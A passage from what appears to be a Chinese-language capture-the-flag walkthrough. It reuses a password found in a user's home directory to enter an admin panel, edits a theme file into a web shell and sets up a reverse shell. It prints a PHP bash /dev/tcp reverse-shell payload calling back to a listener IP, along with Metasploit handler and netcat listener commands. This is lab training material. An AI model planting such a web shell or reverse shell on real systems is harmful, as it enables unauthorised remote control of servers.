...
```
意思是`password.txt`在`/home/saket`目录下
访问后发现内容
`follow_the_ippsec`
似乎是admin.php的密码，尝试一下
进入页面
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250801134451.png)
修改主题文件，为shell文件
## 建立反向shell
...
编辑shell代码
```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.22.157.250/4444 0>&1'"); ?>
```
监听连接
```bash
use exploit/multi/handler
set PAYLOAD php/reverse_php
set LHOST 172.22.157.250  # 替换为你的监听IP（当前脚本指定此IP）
set LPORT 4444            # 与脚本中的端口一致
run
```
nc 监听`nc -lvnp 4444'
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250801140715.png)
